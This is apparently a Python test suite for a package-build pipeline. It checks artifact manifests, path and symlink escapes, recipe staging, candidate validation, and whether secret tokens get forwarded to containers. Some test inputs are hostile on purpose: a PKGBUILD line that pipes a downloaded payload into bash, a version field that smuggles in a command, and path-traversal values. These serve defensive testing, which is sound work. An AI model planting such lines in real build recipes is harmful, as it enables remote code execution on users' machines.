"""Offline tests of staging, artifact trust, and container boundaries."""
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import shutil
import subprocess
import tempfile
import unittest
from unittest.mock import patch


REPO = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("pipeline", REPO / "scripts/pipeline.py")
pipeline = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(pipeline)


class PipelineFixture(unittest.TestCase):
    def setUp(self):
        temporary = tempfile.TemporaryDirectory(prefix="pipeline-test-")
        self.addCleanup(temporary.cleanup)
        self.directory = Path(temporary.name)
        self.repo = self.directory / "repo"
        self.recipe = self.repo / "packages/fixture"
        self.recipe.mkdir(parents=True)
        self.exports = ["PKGBUILD", ".SRCINFO", "fixture.install"]
        self.catalog()
        self.write_recipe(self.recipe, "1.0", "a")
        (self.recipe / "fixture.install").write_text("post_install() { :; }\n")

    def catalog(self, extra="", exports=None):
        config = self.repo / ".config"
        config.mkdir(exist_ok=True)
        (config / "packages.toml").write_text(
            "[packages.fixture]\nexport_files = "
            + json.dumps(self.exports if exports is None else exports) + "\n" + extra)

    def write_recipe(self, directory, version, checksum):
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "PKGBUILD").write_text(
            f"pkgname=fixture\npkgver='{version}'\npkgrel=1\n"
            "pkgdesc='Offline fixture'\narch=('any')\n"
            "source=(\"https://example.invalid/fixture-${pkgver}.tar.gz\")\n"
            f"sha256sums=('{checksum * 64}')\n"
            "package() { install -Dm644 README \"$pkgdir/usr/share/fixture/README\"; }\n")
        (directory / ".SRCINFO").write_text(
            "pkgbase = fixture\n\tpkgdesc = Offline fixture\n"
            f"\tpkgver = {version}\n\tpkgrel = 1\n\tarch = any\n"
            f"\tsource = https://example.invalid/fixture-{version}.tar.gz\n"
            f"\tsha256sums = {checksum * 64}\npkgname = fixture\n")

    @staticmethod
    def digests(directory):
        # Compute fixture manifests independently of the verifier under test.
        return {p.relative_to(directory).as_posix(): hashlib.sha256(p.read_bytes()).hexdigest()
                for p in directory.rglob("*") if p.is_file() and p.name != "manifest.json"}

    def bundle(self):
        bundle = self.directory / "bundle"
        shutil.copytree(self.recipe, bundle / "recipe")
        (bundle / "packages").mkdir()
        (bundle / "sources").mkdir()
        (bundle / "packages/fixture-1.0-1-any.pkg.tar.zst").write_bytes(b"built wrapper")
        (bundle / "sources/fixture-1.0.tar.gz").write_bytes(b"upstream source")
        self.seal_bundle(bundle)
        return bundle

    def seal_bundle(self, bundle, archives=None):
        manifest = {"format": "aur-build-v1", "package": "fixture", "base_commit": "abc123",
                    "image": "sha256:fixture",
                    "archives": archives if archives is not None else
                    ["packages/fixture-1.0-1-any.pkg.tar.zst"], "sha256": self.digests(bundle)}
        (bundle / "manifest.json").write_text(json.dumps(manifest))
        return manifest


class ArtifactTests(PipelineFixture):
    def assert_rejected_before_container(self, bundle):
        with patch.object(pipeline, "container") as container, patch.object(pipeline, "tool_image") as image:
            with self.assertRaises(ValueError):
                pipeline.smoke("fixture", bundle)
            container.assert_not_called()
            image.assert_not_called()

    def test_intact_bundle_runs_smoke_with_only_the_wrapper_selected(self):
        bundle = self.bundle()
        with patch.object(pipeline, "container") as container, patch.object(pipeline, "tool_image", return_value="tools"):
            pipeline.smoke("fixture", bundle)
        container.assert_called_once_with("tools", "smoke", "fixture", artifact=bundle.resolve())
        self.assertEqual(pipeline.verify_bundle(bundle, "fixture")["archives"],
                         ["packages/fixture-1.0-1-any.pkg.tar.zst"])

    def test_tampered_recipe_archive_and_extra_file_fail_before_smoke(self):
        bundle = self.bundle()
        for filename in ("recipe/PKGBUILD", "packages/fixture-1.0-1-any.pkg.tar.zst", "sources/private"):
            with self.subTest(filename=filename):
                path = bundle / filename
                before = path.read_bytes() if path.exists() else None
                path.write_bytes(b"tampered")
                self.assert_rejected_before_container(bundle)
                if before is None:
                    path.unlink()
                else:
                    path.write_bytes(before)

    def test_archive_escape_and_source_selection_fail_even_with_fresh_hashes(self):
        bundle = self.bundle()
        for filename in ("../outside.pkg.tar.zst", "/tmp/outside.pkg.tar.zst",
                         "packages/../sources/fixture-1.0.tar.gz", "sources/fixture-1.0.tar.gz"):
            with self.subTest(filename=filename):
                self.seal_bundle(bundle, [filename])
                self.assert_rejected_before_container(bundle)

    def test_upstream_archive_in_package_directory_is_not_a_wrapper(self):
        bundle = self.bundle()
        shutil.copyfile(bundle / "sources/fixture-1.0.tar.gz", bundle / "packages/fixture-1.0.tar.gz")
        self.seal_bundle(bundle, ["packages/fixture-1.0.tar.gz"])
        self.assert_rejected_before_container(bundle)

    def test_implicit_debug_archive_is_a_valid_additional_output(self):
        bundle = self.bundle()
        debug = "packages/fixture-debug-1.0-1-any.pkg.tar.zst"
        (bundle / debug).write_bytes(b"detached debug symbols")
        self.seal_bundle(bundle, ["packages/fixture-1.0-1-any.pkg.tar.zst", debug])
        self.assertEqual(len(pipeline.verify_bundle(bundle, "fixture")["archives"]), 2)
        self.seal_bundle(bundle, [debug])
        with self.assertRaisesRegex(ValueError, "Missing required"):
            pipeline.verify_bundle(bundle, "fixture")

    def test_symlink_in_bundle_is_rejected_before_smoke(self):
        bundle = self.bundle()
        outside = self.directory / "outside"
        outside.write_text("private")
        (bundle / "sources/link").symlink_to(outside)
        self.assert_rejected_before_container(bundle)


class RecipeStagingTests(PipelineFixture):
    def test_only_exports_updater_and_native_config_are_staged(self):
        self.catalog('update_hook = "scripts/update.py"\nsmoke_hook = "scripts/smoke.sh"\n')
        scripts = self.recipe / "scripts"
        scripts.mkdir()
        (scripts / "update.py").write_text("# updater\n")
        (scripts / "smoke.sh").write_text("# runtime hook\n")
        (self.recipe / ".nvchecker.toml").write_text('[fixture]\nsource="manual"\nmanual="1"\n')
        (self.recipe / "private-token").write_text("must stay private")
        destination = self.directory / "staging"
        pipeline.copy_recipe("fixture", destination, self.repo)
        expected = {*self.exports, "scripts/update.py", ".nvchecker.toml"}
        self.assertEqual({p.relative_to(destination).as_posix() for p in destination.rglob("*") if p.is_file()}, expected)
        for filename in expected:
            self.assertEqual((self.recipe / filename).read_bytes(), (destination / filename).read_bytes())

    def test_declared_outside_paths_are_rejected(self):
        for filename in ("../private", "/tmp/private", "sub/../../private"):
            with self.subTest(filename=filename):
                self.catalog(exports=[*self.exports, filename])
                with self.assertRaises(ValueError):
                    pipeline.copy_recipe("fixture", self.directory / "staging", self.repo)

    def test_export_updater_native_and_parent_symlinks_are_rejected(self):
        outside = self.directory / "outside"
        outside.mkdir()
        (outside / "secret").write_text("private")
        for filename in ("fixture.install", "update.py", ".nvchecker.toml", "linked/secret"):
            with self.subTest(filename=filename):
                self.catalog('update_hook = "update.py"\n' if filename == "update.py" else "",
                             exports=[*self.exports, filename] if filename == "linked/secret" else None)
                link = self.recipe / ("linked" if filename == "linked/secret" else filename)
                original = link.read_bytes() if link.exists() else None
                if link.exists():
                    link.unlink()
                link.symlink_to(outside if filename == "linked/secret" else outside / "secret")
                try:
                    with self.assertRaises(ValueError):
                        pipeline.copy_recipe("fixture", self.directory / filename.replace("/", "-") / "staging", self.repo)
                finally:
                    link.unlink()
                    if original is not None:
                        link.write_bytes(original)

    def test_failed_native_container_cannot_partially_update_checkout(self):
        (self.recipe / ".nvchecker.toml").write_text('[fixture]\nsource="manual"\nmanual="2"\n')
        before = {p.name: p.read_bytes() for p in self.recipe.iterdir() if p.is_file()}

        def fail_update(image, mode, *args, work, **kwargs):
            self.assertEqual(mode, "version-update")
            self.assertEqual(args, ("fixture", "-", "-"))
            self.assertNotEqual(work / "project", self.recipe)
            self.assertTrue((work / "project/.nvchecker.toml").is_file())
            (work / "project/PKGBUILD").write_text("partially upgraded")
            raise subprocess.CalledProcessError(1, ["fake-container", mode])

        with patch.object(pipeline, "tool_image", return_value="tools"), patch.object(pipeline, "container", side_effect=fail_update):
            with self.assertRaises(subprocess.CalledProcessError):
                pipeline.version("fixture", "update", self.repo)
        self.assertEqual(before, {p.name: p.read_bytes() for p in self.recipe.iterdir() if p.is_file()})

    def test_concurrent_checkout_edit_is_preserved_after_successful_staged_update(self):
        def changed_during_update(image, mode, *args, work, **kwargs):
            (work / "project/PKGBUILD").write_text("staged version update\n")
            (self.recipe / "PKGBUILD").write_text("concurrent maintainer edit\n")
        with patch.object(pipeline, "tool_image", return_value="tools"), \
                patch.object(pipeline, "container", side_effect=changed_during_update):
            with self.assertRaisesRegex(ValueError, "changed while"):
                pipeline.version("fixture", "update", self.repo)
        self.assertEqual((self.recipe / "PKGBUILD").read_text(), "concurrent maintainer edit\n")


class CandidateTests(PipelineFixture):
    def setUp(self):
        super().setUp()
        subprocess.run(["git", "init", "-q", str(self.repo)], check=True)
        subprocess.run(["git", "-C", str(self.repo), "add", "."], check=True)
        subprocess.run(["git", "-C", str(self.repo), "-c", "user.name=Fixture", "-c",
                        "user.email=fixture@example.invalid", "-c", "commit.gpgsign=false",
                        "commit", "-qm", "fixture"], check=True)
        self.head = subprocess.check_output(["git", "-C", str(self.repo), "rev-parse", "HEAD"], text=True).strip()
        self.candidate = self.directory / "candidate"
        shutil.copytree(self.recipe, self.candidate)
        self.write_recipe(self.candidate, "2.0", "b")
        self.policy = pipeline.CandidatePolicy(self.repo, "fixture", self.exports)
        self.seal_candidate()

    def seal_candidate(self):
        (self.candidate / "manifest.json").write_text(json.dumps(
            {"base_commit": self.head, "version": "2.0", "pkgrel": "1", "sha256": self.digests(self.candidate)}))

    def validate_without_source_execution(self):
        # Validation may query Git, but must never execute a candidate or invoke a shell.
        real_run = subprocess.run

        def git_only(args, **kwargs):
            self.assertEqual(tuple(args), ("git", "rev-parse", "HEAD"))
            self.assertFalse(kwargs.get("shell", False))
            return real_run(args, **kwargs)

        with patch.object(pipeline.subprocess, "run", side_effect=git_only):
            return self.policy.validate(self.candidate)

    def test_accepts_literal_release_and_checksum_change(self):
        manifest = self.validate_without_source_execution()
        self.assertEqual(manifest["version"], "2.0")
        self.assertEqual(manifest["sha256"], self.digests(self.candidate))

    def test_rejects_rehashed_recipe_srcinfo_checksum_disagreement(self):
        info = self.candidate / ".SRCINFO"
        info.write_text(info.read_text().replace("b" * 64, "c" * 64))
        self.seal_candidate()
        with self.assertRaisesRegex(ValueError, "checksums disagree"):
            self.validate_without_source_execution()

    def test_rejects_executable_release_value_without_executing_it(self):
        marker = self.directory / "executed"
        path = self.candidate / "PKGBUILD"
        path.write_text(path.read_text().replace("pkgver='2.0'", f'pkgver=$(touch "{marker}")'))
        self.seal_candidate()
        with self.assertRaises(ValueError):
            self.validate_without_source_execution()
        self.assertFalse(marker.exists())

    def test_rejects_rehashed_changes_outside_release_fields(self):
        mutations = {"code": ("PKGBUILD", "\nprepare() { curl https://example.invalid/payload | bash; }\n"),
                     "metadata": (".SRCINFO", "\tdepends = surprise\n"),
                     "extra artifact": ("payload.pkg.tar.zst", "payload"),
                     "nonrelease file": ("fixture.install", "\npost_upgrade() { :; }\n")}
        for label, (filename, addition) in mutations.items():
            with self.subTest(change=label):
                path = self.candidate / filename
                original = path.read_bytes() if path.exists() else None
                path.write_bytes((original or b"") + addition.encode())
                self.seal_candidate()
                with self.assertRaises(ValueError):
                    self.validate_without_source_execution()
                if original is None:
                    path.unlink()
                else:
                    path.write_bytes(original)


class ContainerBoundaryTests(PipelineFixture):
    def test_build_forwards_metadata_token_only_to_updating_prepare(self):
        for update in (False, True):
            with self.subTest(update=update):
                calls = []

                def docker(args, **kwargs):
                    self.assertEqual(args[0], "docker")
                    if args[1] == "image":
                        return subprocess.CompletedProcess(args, 0, stdout="sha256:fixture\n")
                    self.assertEqual(args[1], "run")
                    mode = args[args.index("/repo/scripts/arch.sh") + 1]
                    calls.append((mode, args))
                    mounts = [args[i + 1] for i, value in enumerate(args) if value == "--volume"]
                    work_mount = next(value for value in mounts if value.endswith(":/work"))
                    work = Path(work_mount.removesuffix(":/work"))
                    if mode == "build":
                        (work / "packages").mkdir()
                        (work / "sources").mkdir()
                        (work / "packages/fixture-1.0-1-any.pkg.tar.zst").write_bytes(b"wrapper")
                        (work / "sources/fixture-1.0.tar.gz").write_bytes(b"upstream")
                        (work / "build-report.json").write_text(json.dumps(["fixture-1.0-1-any.pkg.tar.zst"]))
                    return subprocess.CompletedProcess(args, 0, stdout="")

                real_copy = pipeline.copy_recipe
                with patch.dict(os.environ, GH_TOKEN="host-gh-secret", GITHUB_TOKEN="host-github-secret"), \
                        patch.object(pipeline, "spec", return_value={"export_files": self.exports}), \
                        patch.object(pipeline, "copy_recipe", side_effect=lambda name, dest: real_copy(name, dest, self.repo)), \
                        patch.object(pipeline, "tool_image", return_value="tools"), \
                        patch.object(pipeline.subprocess, "run", side_effect=docker):
                    output = self.directory / f"output-{update}"
                    pipeline.build("fixture", output, update=update, base="fixture-head")
                self.assertEqual([mode for mode, _ in calls], ["prepare", "build"])
                for mode, argv in calls:
                    forwarded = [argv[i + 1] for i, value in enumerate(argv) if value == "--env"]
                    self.assertEqual("GH_TOKEN" in forwarded, update and mode == "prepare")
                    self.assertNotIn("GITHUB_TOKEN", forwarded)
                manifest = pipeline.verify_bundle(output, "fixture")
                self.assertEqual(manifest["archives"], ["packages/fixture-1.0-1-any.pkg.tar.zst"])
                self.assertTrue((output / "sources/fixture-1.0.tar.gz").is_file())

    def test_only_explicit_metadata_flag_forwards_token_and_mounts_are_bounded(self):
        work = self.directory / "work"
        artifact = self.directory / "artifact"
        for mode, metadata in (("build", False), ("smoke", False), ("prepare", False), ("prepare", True)):
            with self.subTest(mode=mode, metadata=metadata), patch.dict(
                    os.environ, GH_TOKEN="host-gh-secret", GITHUB_TOKEN="host-github-secret",
                    SSH_AUTH_SOCK="/host/agent.sock"), patch.object(pipeline.subprocess, "run") as run:
                run.return_value = subprocess.CompletedProcess([], 0, stdout="")
                pipeline.container("tools", mode, "fixture", work=work, artifact=artifact,
                                   metadata_token=metadata, privileged=mode == "build")
                run.assert_called_once()
                argv = run.call_args.args[0]
                forwarded = [argv[i + 1] for i, value in enumerate(argv) if value == "--env"]
                self.assertEqual("GH_TOKEN" in forwarded, metadata)
                self.assertFalse(any(value.startswith(("GH_TOKEN=", "GITHUB_TOKEN", "SSH_AUTH_SOCK")) for value in forwarded))
                self.assertNotIn("host-gh-secret", argv)
                self.assertNotIn("host-github-secret", argv)
                mounts = [argv[i + 1] for i, value in enumerate(argv) if value == "--volume"]
                self.assertEqual(set(mounts), {f"{pipeline.ROOT}:/repo:ro", f"{work.resolve()}:/work",
                                               f"{artifact.resolve()}:/artifacts:ro"})
                self.assertFalse(any(value in argv for value in ("--env-file", "--mount", "-v", "-e")))
                self.assertEqual(tuple(argv[-5:]), ("tools", "bash", "/repo/scripts/arch.sh", mode, "fixture"))

    def test_runtime_rejects_injected_token_before_any_command(self):
        for token in ("GH_TOKEN", "GITHUB_TOKEN"):
            with self.subTest(token=token), patch.dict(os.environ, {token: "injected"}), patch.object(pipeline, "command") as command:
                with self.assertRaises(ValueError):
                    pipeline.inside_smoke("fixture")
                command.assert_not_called()


class DebugOutputTests(PipelineFixture):
    def test_optional_debug_output_can_be_present_or_absent(self):
        for produced in (False, True):
            with self.subTest(produced=produced):
                work = self.directory / f"work-{produced}"
                shutil.copytree(self.recipe, work / "project")
                (work / "packages").mkdir()
                regular = work / "packages/fixture-1.0-1-any.pkg.tar.zst"
                debug = work / "packages/fixture-debug-1.0-1-any.pkg.tar.zst"
                regular.write_bytes(b"main")
                if produced:
                    debug.write_bytes(b"debug")
                (work / "package-files").write_text(f"{regular}\n{debug}\n")
                def metadata(*args, **kwargs):
                    pkgname = "fixture-debug" if Path(args[2]) == debug else "fixture"
                    return f"pkgname = {pkgname}\npkgver = 1.0-1\n"
                with patch.object(pipeline, "command", side_effect=metadata):
                    pipeline.inside_build_report("fixture", work)
                self.assertEqual(json.loads((work / "build-report.json").read_text()),
                                 [regular.name, debug.name] if produced else [regular.name])
                regular.unlink()
                with self.assertRaisesRegex(ValueError, "Missing required"):
                    pipeline.inside_build_report("fixture", work)


if __name__ == "__main__":
    unittest.main()
